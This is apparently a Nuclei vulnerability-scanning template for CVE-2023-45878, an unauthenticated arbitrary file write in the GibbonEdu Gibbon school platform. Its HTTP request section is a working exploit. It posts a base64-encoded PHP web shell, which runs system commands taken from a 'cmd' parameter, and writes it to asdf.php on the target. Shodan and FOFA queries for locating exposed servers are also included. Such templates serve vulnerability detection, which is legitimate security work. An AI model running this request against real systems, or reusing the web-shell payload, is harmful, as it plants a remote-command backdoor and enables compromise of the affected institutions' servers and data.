id: CVE-2023-45878

info:
  name: Arbitrary File Write in Gibbon Edu
  author: ProjectDiscoveryAI
  severity: critical
  description: GibbonEdu Gibbon version 25.0.1 and before allows Arbitrary File Write because rubrics_visualise_saveAjax.phps does not require authentication. The endpoint accepts the img, path, and gibbonPersonID parameters. The img parameter is expected to be a base64 encoded image. If the path parameter is set, the defined path is used as the destination folder, concatenated with the absolute path of the installation directory. The content of the img parameter is base64 decoded and written to the defined file path. This allows creation of PHP files that permit Remote Code Execution (unauthenticated).
  impact: |
    An attacker could potentially write malicious files on the server, leading to data leakage, unauthorized access, or system compromise.
  remediation: |
    Apply the vendor-supplied patch or update to the latest version to mitigate the arbitrary file write vulnerability in Gibbon Edu.
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 9.8
    cve-id: CVE-2023-45878
    epss-score: 0.00915
    epss-percentile: 0.83476
    cpe: cpe:2.3:a:gibbonedu:gibbon:*:*:*:*:*:*:*:*
  metadata:
    vendor: gibbonedu
    product: gibbon
    shodan-query: http.favicon.hash:-165631681
    fofa-query: icon_hash="-165631681"

http:
  - method: POST
    path:
      - "{{BaseURL}}/modules/Rubrics/rubrics_visualise_saveAjax.php"

    headers:
      Content-Type: application/x-www-form-urlencoded

    body: |
      img=image/png;asdf,PD9waHAgZWNobyBzeXN0ZW0oJF9HRVRbJ2NtZCddKT8%2b&path=asdf.php&gibbonPersonID=0000000001
    matchers:
      - type: word
        words:
          - "File uploaded successfully"
        part: body
